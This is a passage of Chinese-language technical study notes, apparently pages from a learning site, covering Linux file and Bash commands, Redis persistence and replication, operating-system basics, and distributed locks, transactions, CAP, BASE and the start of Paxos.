links, xattr 等也复制了 7. rm # 删除文件。\n## rm [-fir] 文件或目录 -r ：递归删除 8. mv # 移动文件。\n## mv [-fiu] source destination ## mv [options] source1 source2 source3 .... directory -f ： force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖 修改权限 # 可以将一组权限用数字来表示，此时一组权限的 3 个位当做二进制数字的位，从左到右每个位的权值为 4、2、1，即每个权限对应的数字权值为 r : 4、w : 2、x : 1。\n## chmod [-R] xyz dirname/filename 示例：将 .bashrc 文件的权限修改为 -rwxr-xr\u0026ndash;。\n## chmod 754 .bashrc 也可以使用符号来设定权限。\n## chmod [ugoa] [+-=] [rwx] dirname/filename - u：拥有者 - g：所属群组 - o：其他人 - a：所有人 - +：添加权限 - -：移除权限 - =：设定权限 示例：为 .bashrc 文件的所有用户添加写权限。\n## chmod a+w .bashrc 默认权限 # 文件默认权限：文件默认没有可执行权限，因此为 666，也就是 -rw-rw-rw- 。 目录默认权限：目录必须要能够进入，也就是必须拥有可执行权限，因此为 777 ，也就是 drwxrwxrwx。 可以通过 umask 设置或者查看默认权限，通常以掩码的形式来表示，例如 002 表示其它用户的权限去除了一个 2 的权限，也就是写权限，因此建立新文件时默认的权限为 -rw-rw-r\u0026ndash;。\n目录的权限 # 文件名不是存储在一个文件的内容中，而是存储在一个文件所在的目录中。因此，拥有文件的 w 权限并不能对文件名进行修改。\n目录存储文件列表，一个目录的权限也就是对其文件列表的权限。因此，目录的 r 权限表示可以读取文件列表；w 权限表示可以修改文件列表，具体来说，就是添加删除文件，对文件名进行修改；x 权限可以让该目录成为工作目录，x 权限是 r 和 w 权限的基础，如果不能使一个目录成为工作目录，也就没办法读取文件列表以及对文件列表进行修改了。\n链接 # ## ln [-sf] source_filename dist_filename -s ：默认是实体链接，加 -s 为符号链接 -f ：如果目标文件存在时，先删除目标文件 1. 实体链接 # 在目录下创建一个条目，记录着文件名与 inode 编号，这个 inode 就是源文件的 inode。\n删除任意一个条目，文件还是存在，只要引用数量不为 0。\n有以下限制：不能跨越文件系统、不能对目录进行链接。\n## ln /etc/crontab . ## ll -i /etc/crontab crontab 34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 crontab 34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab 2. 符号链接 # 符号链接文件保存着源文件所在的绝对路径，在读取时会定位到源文件上，可以理解为 Windows 的快捷方式。\n当源文件被删除了，链接文件就打不开了。\n因为记录的是路径，所以可以为目录建立符号链接。\n## ll -i /etc/crontab /root/crontab2 34474855 -rw-r--r--. 2 root root 451 Jun 10 2014 /etc/crontab 53745909 lrwxrwxrwx. 1 root root 12 Jun 23 22:31 /root/crontab2 -\u0026gt; /etc/crontab 获取文件内容 # 1. cat # 取得文件内容。\n## cat [-AbEnTv] filename -n ：打印出行号，连同空白行也会有行号，-b 不会 2. tac # 是 cat 的反向操作，从最后一行开始打印。\n3. more # 和 cat 不同的是它可以一页一页查看文件内容，比较适合大文件的查看。\n4. less # 和 more 类似，但是多了一个向前翻页的功能。\n5. head # 取得文件前几行。\n## head [-n number] filename -n ：后面接数字，代表显示几行的意思 6. tail # 是 head 的反向操作，只是取得是后几行。\n7. od # 以字符或者十六进制的形式显示二进制文件。\n指令与文件搜索 # 1. which # 指令搜索。\n## which [-a] command -a ：将所有指令列出，而不是只列第一个 2. whereis # 文件搜索。速度比较快，因为它只搜索几个特定的目录。\n## whereis [-bmsu] dirname/filename 3. locate # 文件搜索。可以用关键字或者正则表达式进行搜索。\nlocate 使用 /var/lib/mlocate/ 这个数据库来进行搜索，它存储在内存中，并且每天更新一次，所以无法用 locate 搜索新建的文件。可以使用 updatedb 来立即更新数据库。\n## locate [-ir] keyword -r：正则表达式 4. find # 文件搜索。可以使用文件的属性和权限进行搜索。\n## find [basedir] [option] example: find . -name \u0026#34;shadow*\u0026#34; ① 与时间有关的选项\n-mtime n ：列出在 n 天前的那一天修改过内容的文件 -mtime +n ：列出在 n 天之前 (不含 n 天本身) 修改过内容的文件 -mtime -n ：列出在 n 天之内 (含 n 天本身) 修改过内容的文件 -newer file ： 列出比 file 更新的文件 +4、4 和 -4 的指示的时间范围如下：\n② 与文件拥有者和所属群组有关的选项\n-uid n -gid n -user name -group name -nouser ：搜索拥有者不存在 /etc/passwd 的文件 -nogroup：搜索所属群组不存在于 /etc/group 的文件 ③ 与文件权限和名称有关的选项\n-name filename -size [+-]SIZE：搜寻比 SIZE 还要大 (+) 或小 (-) 的文件。这个 SIZE 的规格有：c: 代表 byte，k: 代表 1024bytes。所以，要找比 50KB 还要大的文件，就是 -size +50k -type TYPE -perm mode ：搜索权限等于 mode 的文件 -perm -mode ：搜索权限包含 mode 的文件 -perm /mode ：搜索权限包含任一 mode 的文件 压缩与打包 # 压缩文件名 # Linux 底下有很多压缩文件名，常见的如下：\n扩展名 压缩程序 *.Z compress *.zip zip *.gz gzip *.bz2 bzip2 *.xz xz *.tar tar 程序打包的数据，没有经过压缩 *.tar.gz tar 程序打包的文件，经过 gzip 的压缩 *.tar.bz2 tar 程序打包的文件，经过 bzip2 的压缩 *.tar.xz tar 程序打包的文件，经过 xz 的压缩 压缩指令 # 1. gzip # gzip 是 Linux 使用最广的压缩指令，可以解开 compress、zip 与 gzip 所压缩的文件。\n经过 gzip 压缩过，源文件就不存在了。\n有 9 个不同的压缩等级可以使用。\n可以使用 zcat、zmore、zless 来读取压缩文件的内容。\n$ gzip [-cdtv#] filename -c ：将压缩的数据输出到屏幕上 -d ：解压缩 -t ：检验压缩文件是否出错 -v ：显示压缩比等信息 -# ： # 为数字的意思，代表压缩等级，数字越大压缩比越高，默认为 6 2. bzip2 # 提供比 gzip 更高的压缩比。\n查看命令：bzcat、bzmore、bzless、bzgrep。\n$ bzip2 [-cdkzv#] filename -k ：保留源文件 3. xz # 提供比 bzip2 更佳的压缩比。\n可以看到，gzip、bzip2、xz 的压缩比不断优化。不过要注意的是，压缩比越高，压缩的时间也越长。\n查看命令：xzcat、xzmore、xzless、xzgrep。\n$ xz [-dtlkc#] filename 打包 # 压缩指令只能对一个文件进行压缩，而打包能够将多个文件打包成一个大文件。tar 不仅可以用于打包，也可以使用 gzip、bzip2、xz 将打包文件进行压缩。\n$ tar [-z|-j|-J] [cv] [-f 新建的 tar 文件] filename... ==打包压缩 $ tar [-z|-j|-J] [tv] [-f 已有的 tar 文件] ==查看 $ tar [-z|-j|-J] [xv] [-f 已有的 tar 文件] [-C 目录] ==解压缩 -z ：使用 zip； -j ：使用 bzip2； -J ：使用 xz； -c ：新建打包文件； -t ：查看打包文件里面有哪些文件； -x ：解打包或解压缩的功能； -v ：在压缩/解压缩的过程中，显示正在处理的文件名； -f : filename：要处理的文件； -C 目录 ： 在特定目录解压缩。 使用方式 命令 打包压缩 tar -jcv -f filename.tar.bz2 要被压缩的文件或目录名称 查 看 tar -jtv -f filename.tar.bz2 解压缩 tar -jxv -f filename.tar.bz2 -C 要解压缩的目录 Bash # 可以通过 Shell 请求内核提供服务，Bash 正是 Shell 的一种。\n特性 # 命令历史：记录使用过的命令 命令与文件补全：快捷键：tab 命名别名：例如 ll 是 ls -al 的别名 shell scripts 通配符：例如 ls -l /usr/bin/X* 列出 /usr/bin 下面所有以 X 开头的文件 变量操作 # 对一个变量赋值直接使用 =。\n对变量取用需要在变量前加上 $ ，也可以用 ${} 的形式；\n输出变量使用 echo 命令。\n$ x=abc $ echo $x $ echo ${x} 变量内容如果有空格，必须使用双引号或者单引号。\n双引号内的特殊字符可以保留原本特性，例如 x=\u0026ldquo;lang is $LANG\u0026rdquo;，则 x 的值为 lang is zh_TW.UTF-8； 单引号内的特殊字符就是特殊字符本身，例如 x=\u0026lsquo;lang is $LANG\u0026rsquo;，则 x 的值为 lang is $LANG。 可以使用 指令 或者 $(指令) 的方式将指令的执行结果赋值给变量。例如 version=$(uname -r)，则 version 的值为 4.15.0-22-generic。\n可以使用 export 命令将自定义变量转成环境变量，环境变量可以在子程序中使用，所谓子程序就是由当前 Bash 而产生的子 Bash。\nBash 的变量可以声明为数组和整数数字。注意数字类型没有浮点数。如果不进行声明，默认是字符串类型。变量的声明使用 declare 命令：\n$ declare [-aixr] variable -a ： 定义为数组类型 -i ： 定义为整数类型 -x ： 定义为环境变量 -r ： 定义为 readonly 类型 使用 [ ] 来对数组进行索引操作：\n$ array[1]=a $ array[2]=b $ echo ${array[1]} 指令搜索顺序 # 以绝对或相对路径来执行指令，例如 /bin/ls 或者 ./ls ； 由别名找到该指令来执行； 由 Bash 内置的指令来执行； 按 $PATH 变量指定的搜索路径的顺序找到第一个指令来执行。 数据流重定向 # 重定向指的是使用文件代替标准输入、标准输出和标准错误输出。\n1 代码 运算符 标准输入 (stdin) 0 \u0026lt; 或 \u0026lt;\u0026lt; 标准输出 (stdout) 1 \u0026gt; 或 \u0026gt;\u0026gt; 标准错误输出 (stderr) 2 2\u0026gt; 或 2\u0026gt;\u0026gt; 其中，有一个箭头的表示以覆盖的方式重定向，而有两个箭头的表示以追加的方式重定向。\n可以将不需要的标准输出以及标准错误输出重定向到 /dev/null，相当于扔进垃圾箱。\n如果需要将标准输出以及标准错误输出同时重定向到一个文件，需要将某个输出转换为另一个输出，例如 2\u0026gt;\u0026amp;1 表示将标准错误输出转换为标准输出。\n$ find /home -name .bashrc \u0026gt; list 2\u0026gt;\u0026amp;1 管道指令 # 管道是将一个命令的标准输出作为另一个命令的标准输入，在数据需要经过多个步骤的处理之后才能得到我们想要的内容时就可以使用管道。\n在命令之间使用 | 分隔各个管道命令。\n$ ls -al /etc | less 提取指令 # cut 对数据进行切分，取出想要的部分。\n切分过程一行一行地进行。\n$ cut -d ：分隔符 -f ：经过 -d 分隔后，使用 -f n 取出第 n 个区间 -c ：以字符为单位取出区间 示例 1：last 显示登入者的信息，取出用户名。\n$ last root pts/1 192.168.201.101 Sat Feb 7 12:35 still logged in root pts/1 192.168.201.101 Fri Feb 6 12:13 - 18:46 (06:33) root pts/1 192.168.201.254 Thu Feb 5 22:37 - 23:53 (01:16) $ last | cut -d \u0026#39; \u0026#39; -f 1 示例 2：将 export 输出的信息，取出第 12 字符以后的所有字符串。\n$ export declare -x HISTCONTROL=\u0026#34;ignoredups\u0026#34; declare -x HISTSIZE=\u0026#34;1000\u0026#34; declare -x HOME=\u0026#34;/home/dmtsai\u0026#34; declare -x HOSTNAME=\u0026#34;study.centos.vbird\u0026#34; .....(其他省略)..... $ export | cut -c 12- 排序指令 # sort 用于排序。\n$ sort [-fbMnrtuk] [file or stdin] -f ：忽略大小写 -b ：忽略最前面的空格 -M ：以月份的名字来排序，例如 JAN，DEC -n ：使用数字 -r ：反向排序 -u ：相当于 unique，重复的内容只出现一次 -t ：分隔符，默认为 tab -k ：指定排序的区间 示例：/etc/passwd 文件内容以 : 来分隔，要求以第三列进行排序。\n$ cat /etc/passwd | sort -t \u0026#39;:\u0026#39; -k 3 root:x:0:0:root:/root:/bin/bash dmtsai:x:1000:1000:dmtsai:/home/dmtsai:/bin/bash alex:x:1001:1002::/home/alex:/bin/bash arod:x:1002:1003::/home/arod:/bin/bash uniq 可以将重复的数据只取一个。\n$ uniq [-ic] -i ：忽略大小写 -c ：进行计数 示例：取得每个人的登录总次数\n$ last | cut -d \u0026#39; \u0026#39; -f 1 | sort | uniq -c 1 6 (unknown 47 dmtsai 4 reboot 7 root 1 wtmp 双向输出重定向 # 输出重定向会将输出内容重定向到文件中，而 tee 不仅能够完成这个功能，还能保留屏幕上的输出。也就是说，使用 tee 指令，一个输出会同时传送到文件和屏幕上。\n$ tee [-a] file 字符转换指令 # tr 用来删除一行中的字符，或者对字符进行替换。\n$ tr [-ds] SET1 ... -d ： 删除行中 SET1 这个字符串 示例，将 last 输出的信息所有小写转换为大写。\n$ last | tr \u0026#39;[a-z]\u0026#39; \u0026#39;[A-Z]\u0026#39; col 将 tab 字符转为空格字符。\n$ col [-xb] -x ： 将 tab 键转换成对等的空格键 expand 将 tab 转换一定数量的空格，默认是 8 个。\n$ expand [-t] file -t ：tab 转为空格的数量 join 将有相同数据的那一行合并在一起。\n$ join [-ti12] file1 file2 -t ：分隔符，默认为空格 -i ：忽略大小写的差异 -1 ：第一个文件所用的比较字段 -2 ：第二个文件所用的比较字段 paste 直接将两行粘贴在一起。\n$ paste [-d] file1 file2 -d ：分隔符，默认为 tab 分区指令 # split 将一个文件划分成多个文件。\n$ split [-bl] file PREFIX -b ：以大小来进行分区，可加单位，例如 b, k, m 等 -l ：以行数来进行分区。 - PREFIX ：分区文件的前导名称 "},{"id":10,"href":"/keeplearning/docs/redis/redis2/","title":"Redis（二）","section":"Redis","content":" Redis（二） # 八、持久化 # Redis 是内存型数据库，为了保证数据在断电后不会丢失，需要将内存中的数据持久化到硬盘上。\nRDB 持久化 # 将某个时间点的所有数据都存放到硬盘上。\n可以将快照复制到其它服务器从而创建具有相同数据的服务器副本。\n如果系统发生故障，将会丢失最后一次创建快照之后的数据。\n如果数据量很大，保存快照的时间会很长。\nAOF 持久化 # 将写命令添加到 AOF 文件（Append Only File）的末尾。\n使用 AOF 持久化需要设置同步选项，从而确保写命令同步到磁盘文件上的时机。这是因为对文件进行写入并不会马上将内容同步到磁盘上，而是先存储到缓冲区，然后由操作系统决定什么时候同步到磁盘。有以下同步选项：\n选项 同步频率 always 每个写命令都同步 everysec 每秒同步一次 no 让操作系统来决定何时同步 always 选项会严重减低服务器的性能； everysec 选项比较合适，可以保证系统崩溃时只会丢失一秒左右的数据，并且 Redis 每秒执行一次同步对服务器性能几乎没有任何影响； no 选项并不能给服务器性能带来多大的提升，而且也会增加系统崩溃时数据丢失的数量。 随着服务器写请求的增多，AOF 文件会越来越大。Redis 提供了一种将 AOF 重写的特性，能够去除 AOF 文件中的冗余写命令。\n九、事务 # 一个事务包含了多个命令，服务器在执行事务期间，不会改去执行其它客户端的命令请求。\n事务中的多个命令被一次性发送给服务器，而不是一条一条发送，这种方式被称为流水线，它可以减少客户端与服务器之间的网络通信次数从而提升性能。\nRedis 最简单的事务实现方式是使用 MULTI 和 EXEC 命令将事务操作包围起来。\n十、事件 # Redis 服务器是一个事件驱动程序。\n文件事件 # 服务器通过套接字与客户端或者其它服务器进行通信，文件事件就是对套接字操作的抽象。\nRedis 基于 Reactor 模式开发了自己的网络事件处理器，使用 I/O 多路复用程序来同时监听多个套接字，并将到达的事件传送给文件事件分派器，分派器会根据套接字产生的事件类型调用相应的事件处理器。\n时间事件 # 服务器有一些操作需要在给定的时间点执行，时间事件是对这类定时操作的抽象。\n时间事件又分为：\n定时事件：是让一段程序在指定的时间之内执行一次； 周期性事件：是让一段程序每隔指定时间就执行一次。 Redis 将所有时间事件都放在一个无序链表中，通过遍历整个链表查找出已到达的时间事件，并调用相应的事件处理器。\n事件的调度与执行 # 服务器需要不断监听文件事件的套接字才能得到待处理的文件事件，但是不能一直监听，否则时间事件无法在规定的时间内执行，因此监听时间应该根据距离现在最近的时间事件来决定。\n事件调度与执行由 aeProcessEvents 函数负责，伪代码如下：\ndef aeProcessEvents(): # 获取到达时间离当前时间最接近的时间事件 time_event = aeSearchNearestTimer() # 计算最接近的时间事件距离到达还有多少毫秒 remaind_ms = time_event.when - unix_ts_now() # 如果事件已到达，那么 remaind_ms 的值可能为负数，将它设为 0 if remaind_ms \u0026lt; 0: remaind_ms = 0 # 根据 remaind_ms 的值，创建 timeval timeval = create_timeval_with_ms(remaind_ms) # 阻塞并等待文件事件产生，最大阻塞时间由传入的 timeval 决定 aeApiPoll(timeval) # 处理所有已产生的文件事件 procesFileEvents() # 处理所有已到达的时间事件 processTimeEvents() 将 aeProcessEvents 函数置于一个循环里面，加上初始化和清理函数，就构成了 Redis 服务器的主函数，伪代码如下：\ndef main(): # 初始化服务器 init_server() # 一直处理事件，直到服务器关闭为止 while server_is_not_shutdown(): aeProcessEvents() # 服务器关闭，执行清理操作 clean_server() 从事件处理的角度来看，服务器运行流程如下：\n十一、复制 # 通过使用 slaveof host port 命令来让一个服务器成为另一个服务器的从服务器。\n一个从服务器只能有一个主服务器，并且不支持主主复制。\n连接过程 # 主服务器创建快照文件，发送给从服务器，并在发送期间使用缓冲区记录执行的写命令。快照文件发送完毕之后，开始向从服务器发送存储在缓冲区中的写命令；\n从服务器丢弃所有旧数据，载入主服务器发来的快照文件，之后从服务器开始接受主服务器发来的写命令；\n主服务器每执行一次写命令，就向从服务器发送相同的写命令。\n主从链 # 随着负载不断上升，主服务器可能无法很快地更新所有从服务器，或者重新连接和重新同步从服务器将导致系统超载。为了解决这个问题，可以创建一个中间层来分担主服务器的复制工作。中间层的服务器是最上层服务器的从服务器，又是最下层服务器的主服务器。\n十二、Sentinel # Sentinel（哨兵）可以监听集群中的服务器，并在主服务器进入下线状态时，自动从从服务器中选举出新的主服务器。\n十三、分片 # 分片是将数据划分为多个部分的方法，可以将数据存储到多台机器里面，这种方法在解决某些问题时可以获得线性级别的性能提升。\n假设有 4 个 Redis 实例 R0，R1，R2，R3，还有很多表示用户的键 user:1，user:2，\u0026hellip; ，有不同的方式来选择一个指定的键存储在哪个实例中。\n最简单的方式是范围分片，例如用户 id 从 0~1000 的存储到实例 R0 中，用户 id 从 1001~2000 的存储到实例 R1 中，等等。但是这样需要维护一张映射范围表，维护操作代价很高。 还有一种方式是哈希分片，使用 CRC32 哈希函数将键转换为一个数字，再对实例数量求模就能知道应该存储的实例。 根据执行分片的位置，可以分为三种分片方式：\n客户端分片：客户端使用一致性哈希等算法决定键应当分布到哪个节点。 代理分片：将客户端请求发送到代理上，由代理转发请求到正确的节点上。 服务器分片：Redis Cluster。 十四、一个简单的论坛系统分析 # 该论坛系统功能如下：\n可以发布文章； 可以对文章进行点赞； 在首页可以按文章的发布时间或者文章的点赞数进行排序显示。 文章信息 # 文章包括标题、作者、赞数等信息，在关系型数据库中很容易构建一张表来存储这些信息，在 Redis 中可以使用 HASH 来存储每种信息以及其对应的值的映射。\nRedis 没有关系型数据库中的表这一概念来将同种类型的数据存放在一起，而是使用命名空间的方式来实现这一功能。键名的前面部分存储命名空间，后面部分的内容存储 ID，通常使用 : 来进行分隔。例如下面的 HASH 的键名为 article:92617，其中 article 为命名空间，ID 为 92617。\n点赞功能 # 当有用户为一篇文章点赞时，除了要对该文章的 votes 字段进行加 1 操作，还必须记录该用户已经对该文章进行了点赞，防止用户点赞次数超过 1。可以建立文章的已投票用户集合来进行记录。\n为了节约内存，规定一篇文章发布满一周之后，就不能再对它进行投票，而文章的已投票集合也会被删除，可以为文章的已投票集合设置一个一周的过期时间就能实现这个规定。\n对文章进行排序 # 为了按发布时间和点赞数进行排序，可以建立一个文章发布时间的有序集合和一个文章点赞数的有序集合。（下图中的 score 就是这里所说的点赞数；下面所示的有序集合分值并不直接是时间和点赞数，而是根据时间和点赞数间接计算出来的）\n"},{"id":11,"href":"/keeplearning/docs/os/overview/","title":"操作系统概述","section":"操作系统","content":" 操作系统概述 # 基本特征 # 1. 并发 # 并发是指宏观上在一段时间内能同时运行多个程序，而并行则指同一时刻能运行多个指令。\n并行需要硬件支持，如多流水线、多核处理器或者分布式计算系统。\n操作系统通过引入进程和线程，使得程序能够并发运行。\n2. 共享 # 共享是指系统中的资源可以被多个并发进程共同使用。\n有两种共享方式：互斥共享和同时共享。\n互斥共享的资源称为临界资源，例如打印机等，在同一时刻只允许一个进程访问，需要用同步机制来实现互斥访问。\n3. 虚拟 # 虚拟技术把一个物理实体转换为多个逻辑实体。\n主要有两种虚拟技术：时（时间）分复用技术和空（空间）分复用技术。\n多个进程能在同一个处理器上并发执行使用了时分复用技术，让每个进程轮流占用处理器，每次只执行一小个时间片并快速切换。\n虚拟内存使用了空分复用技术，它将物理内存抽象为地址空间，每个进程都有各自的地址空间。地址空间的页被映射到物理内存，地址空间的页并不需要全部在物理内存中，当使用到一个没有在物理内存的页时，执行页面置换算法，将该页置换到内存中。\n4. 异步 # 异步指进程不是一次性执行完毕，而是走走停停，以不可知的速度向前推进。\n基本功能 # 1. 进程管理 # 进程控制、进程同步、进程通信、死锁处理、处理机调度等。\n2. 内存管理 # 内存分配、地址映射、内存保护与共享、虚拟内存等。\n3. 文件管理 # 文件存储空间的管理、目录管理、文件读写管理和保护等。\n4. 设备管理 # 完成用户的 I/O 请求，方便用户使用各种设备，并提高设备的利用率。\n主要包括缓冲管理、设备分配、设备处理、虛拟设备等。\n系统调用 # 如果一个进程在用户态需要使用内核态的功能，就进行系统调用从而陷入内核，由操作系统代为完成。\nLinux 的系统调用主要有以下这些：\nTask Commands 进程控制 fork(); exit(); wait(); 进程通信 pipe(); shmget(); mmap(); 文件操作 open(); read(); write(); 设备操作 ioctl(); read(); write(); 信息维护 getpid(); alarm(); sleep(); 安全 chmod(); umask(); chown(); 宏内核和微内核 # 1. 宏内核 # 宏内核是将操作系统功能作为一个紧密结合的整体放到内核。\n由于各模块共享信息，因此有很高的性能。\n2. 微内核 # 由于操作系统不断复杂，因此将一部分操作系统功能移出内核，从而降低内核的复杂性。移出的部分根据分层的原则划分成若干服务，相互独立。\n在微内核结构下，操作系统被划分成小的、定义良好的模块，只有微内核这一个模块运行在内核态，其余模块运行在用户态。\n因为需要频繁地在用户态和核心态之间进行切换，所以会有一定的性能损失。\n中断分类 # 1. 外中断 # 由 CPU 执行指令以外的事件引起，如 I/O 完成中断，表示设备输入/输出处理已经完成，处理器能够发送下一个输入/输出请求。此外还有时钟中断、控制台中断等。\n2. 异常 # 由 CPU 执行指令的内部事件引起，如非法操作码、地址越界、算术溢出等。\n3. 陷入 # 在用户程序中使用系统调用。\n"},{"id":12,"href":"/keeplearning/docs/system-design/distributed/","title":"分布式","section":"系统设计","content":" 分布式 # 一、分布式锁 # 在单机场景下，可以使用语言的内置锁来实现进程同步。但是在分布式场景下，需要同步的进程可能位于不同的节点上，那么就需要使用分布式锁。\n阻塞锁通常使用互斥量来实现：\n互斥量为 0 表示有其它进程在使用锁，此时处于锁定状态； 互斥量为 1 表示未锁定状态。 1 和 0 可以用一个整型值表示，也可以用某个数据是否存在表示。\n数据库的唯一索引 # 获得锁时向表中插入一条记录，释放锁时删除这条记录。唯一索引可以保证该记录只被插入一次，那么就可以用这个记录是否存在来判断是否处于锁定状态。\n存在以下几个问题：\n锁没有失效时间，解锁失败的话其它进程无法再获得该锁； 只能是非阻塞锁，插入失败直接就报错了，无法重试； 不可重入，已经获得锁的进程也必须重新获取锁。 Redis 的 SETNX 指令 # 使用 SETNX（set if not exist）指令插入一个键值对，如果 Key 已经存在，那么会返回 False，否则插入成功并返回 True。\nSETNX 指令和数据库的唯一索引类似，保证了只存在一个 Key 的键值对，那么可以用一个 Key 的键值对是否存在来判断是否存于锁定状态。\nEXPIRE 指令可以为一个键值对设置一个过期时间，从而避免了数据库唯一索引实现方式中释放锁失败的问题。\nRedis 的 RedLock 算法 # 使用了多个 Redis 实例来实现分布式锁，这是为了保证在发生单点故障时仍然可用。\n尝试从 N 个互相独立 Redis 实例获取锁； 计算获取锁消耗的时间，只有时间小于锁的过期时间，并且从大多数（N / 2 + 1）实例上获取了锁，才认为获取锁成功； 如果获取锁失败，就到每个实例上释放锁。 Zookeeper 的有序节点 # 1. Zookeeper 抽象模型 # Zookeeper 提供了一种树形结构的命名空间，/app1/p_1 节点的父节点为 /app1。\n2. 节点类型 # 永久节点：不会因为会话结束或者超时而消失； 临时节点：如果会话结束或者超时就会消失； 有序节点：会在节点名的后面加一个数字后缀，并且是有序的，例如生成的有序节点为 /lock/node-0000000000，它的下一个有序节点则为 /lock/node-0000000001，以此类推。 3. 监听器 # 为一个节点注册监听器，在节点状态发生改变时，会给客户端发送消息。\n4. 分布式锁实现 # 创建一个锁目录 /lock； 当一个客户端需要获取锁时，在 /lock 下创建临时的且有序的子节点； 客户端获取 /lock 下的子节点列表，判断自己创建的子节点是否为当前子节点列表中序号最小的子节点，如果是则认为获得锁；否则监听自己的前一个子节点，获得子节点的变更通知后重复此步骤直至获得锁； 执行业务代码，完成后，删除对应的子节点。 5. 会话超时 # 如果一个已经获得锁的会话超时了，因为创建的是临时节点，所以该会话对应的临时节点会被删除，其它会话就可以获得锁了。可以看到，这种实现方式不会出现数据库的唯一索引实现方式释放锁失败的问题。\n6. 羊群效应 # 一个节点未获得锁，只需要监听自己的前一个子节点，这是因为如果监听所有的子节点，那么任意一个子节点状态改变，其它所有子节点都会收到通知（羊群效应，一只羊动起来，其它羊也会一哄而上），而我们只希望它的后一个子节点收到通知。\n二、分布式事务 # 指事务的操作位于不同的节点上，需要保证事务的 ACID 特性。\n例如在下单场景下，库存和订单如果不在同一个节点上，就涉及分布式事务。\n分布式锁和分布式事务区别：\n锁问题的关键在于进程操作的互斥关系，例如多个进程同时修改账户的余额，如果没有互斥关系则会导致该账户的余额不正确。 而事务问题的关键则在于事务涉及的一系列操作需要满足 ACID 特性，例如要满足原子性操作则需要这些操作要么都执行，要么都不执行。 2PC # 两阶段提交（Two-phase Commit，2PC），通过引入协调者（Coordinator）来协调参与者的行为，并最终决定这些参与者是否要真正执行事务。\n1. 运行过程 # 1.1 准备阶段 # 协调者询问参与者事务是否执行成功，参与者发回事务执行结果。询问可以看成一种投票，需要参与者都同意才能执行。\n1.2 提交阶段 # 如果事务在每个参与者上都执行成功，事务协调者发送通知让参与者提交事务；否则，协调者发送通知让参与者回滚事务。\n需要注意的是，在准备阶段，参与者执行了事务，但是还未提交。只有在提交阶段接收到协调者发来的通知后，才进行提交或者回滚。\n2. 存在的问题 # 2.1 同步阻塞 # 所有事务参与者在等待其它参与者响应的时候都处于同步阻塞等待状态，无法进行其它操作。\n2.2 单点问题 # 协调者在 2PC 中起到非常大的作用，发生故障将会造成很大影响。特别是在提交阶段发生故障，所有参与者会一直同步阻塞等待，无法完成其它操作。\n2.3 数据不一致 # 在提交阶段，如果协调者只发送了部分 Commit 消息，此时网络发生异常，那么只有部分参与者接收到 Commit 消息，也就是说只有部分参与者提交了事务，使得系统数据不一致。\n2.4 太过保守 # 任意一个节点失败就会导致整个事务失败，没有完善的容错机制。\n本地消息表 # 本地消息表与业务数据表处于同一个数据库中，这样就能利用本地事务来保证在对这两个表的操作满足事务特性，并且使用了消息队列来保证最终一致性。\n在分布式事务操作的一方完成写业务数据的操作之后向本地消息表发送一个消息，本地事务能保证这个消息一定会被写入本地消息表中。 之后将本地消息表中的消息转发到消息队列中，如果转发成功则将消息从本地消息表中删除，否则继续重新转发。 在分布式事务操作的另一方从消息队列中读取一个消息，并执行消息中的操作。 三、CAP # 分布式系统不可能同时满足一致性（C：Consistency）、可用性（A：Availability）和分区容忍性（P：Partition Tolerance），最多只能同时满足其中两项。\n一致性 # 一致性指的是多个数据副本是否能保持一致的特性，在一致性的条件下，系统在执行数据更新操作之后能够从一致性状态转移到另一个一致性状态。\n对系统的一个数据更新成功之后，如果所有用户都能够读取到最新的值，该系统就被认为具有强一致性。\n可用性 # 可用性指分布式系统在面对各种异常时可以提供正常服务的能力，可以用系统可用时间占总时间的比值来衡量，4 个 9 的可用性表示系统 99.99% 的时间是可用的。\n在可用性条件下，要求系统提供的服务一直处于可用的状态，对于用户的每一个操作请求总是能够在有限的时间内返回结果。\n分区容忍性 # 网络分区指分布式系统中的节点被划分为多个区域，每个区域内部可以通信，但是区域之间无法通信。\n在分区容忍性条件下，分布式系统在遇到任何网络分区故障的时候，仍然需要能对外提供一致性和可用性的服务，除非是整个网络环境都发生了故障。\n权衡 # 在分布式系统中，分区容忍性必不可少，因为需要总是假设网络是不可靠的。因此，CAP 理论实际上是要在可用性和一致性之间做权衡。\n可用性和一致性往往是冲突的，很难使它们同时满足。在多个节点之间进行数据同步时，\n为了保证一致性（CP），不能访问未同步完成的节点，也就失去了部分可用性； 为了保证可用性（AP），允许读取所有节点的数据，但是数据可能不一致。 四、BASE # BASE 是基本可用（Basically Available）、软状态（Soft State）和最终一致性（Eventually Consistent）三个短语的缩写。\nBASE 理论是对 CAP 中一致性和可用性权衡的结果，它的核心思想是：即使无法做到强一致性，但每个应用都可以根据自身业务特点，采用适当的方式来使系统达到最终一致性。\n基本可用 # 指分布式系统在出现故障的时候，保证核心可用，允许损失部分可用性。\n例如，电商在做促销时，为了保证购物系统的稳定性，部分消费者可能会被引导到一个降级的页面。\n软状态 # 指允许系统中的数据存在中间状态，并认为该中间状态不会影响系统整体可用性，即允许系统不同节点的数据副本之间进行同步的过程存在时延。\n最终一致性 # 最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能达到一致的状态。\nACID 要求强一致性，通常运用在传统的数据库系统上。而 BASE 要求最终一致性，通过牺牲强一致性来达到可用性，通常运用在大型分布式系统中。\n在实际的分布式场景中，不同业务单元和组件对一致性的要求是不同的，因此 ACID 和 BASE 往往会结合在一起使用。\n五、Paxos # 用于达成共识性问题，即对多个节点产生的值，该算法能保证只选出唯一一个值。\n主要有三类节点：\n提议者（Proposer）：提议一个值； 接受者（Acceptor）：对每个提议进行投票； 告知者（Learner）：被告知投票的结果，不参与投票过程。 执行过程 # 规定一个提议包含两个字段：[n, v]，其中 n 为序号（具有唯一性），v 为提议值。\n1. Prepare 阶段 # 下图演示了两个 Proposer 和三个 Acceptor 的系统中运行该算法的初始过程，每个 Proposer 都会向所有 Acceptor 发送 Prepare 请求。\n当 Acceptor 接收到一个 Prepare 请求，包含的提议为 [n1, v1]，并且之前还未接收过 Prepare 请求，那么发送一个 Prepare 响应，设置当前接收到的提议为 [n1, v1]，并且保证以后不会再接受序号小于 n1 的提议。\n如下图，Acceptor X 在收到 [n=2, v=8] 的 Prepare 请求时，由于之前没有接收过提议，因此就发送一个 [no previous] 的 Prepare 响应，设置当前接收到的提议为 [n=2, v=8]，并且保证以后不会再接受序号小于 2 的提议。其它的 Acceptor 类似。\n如果 Acceptor 接收到一个 Prepare 请求，包含的提议为 [n2, 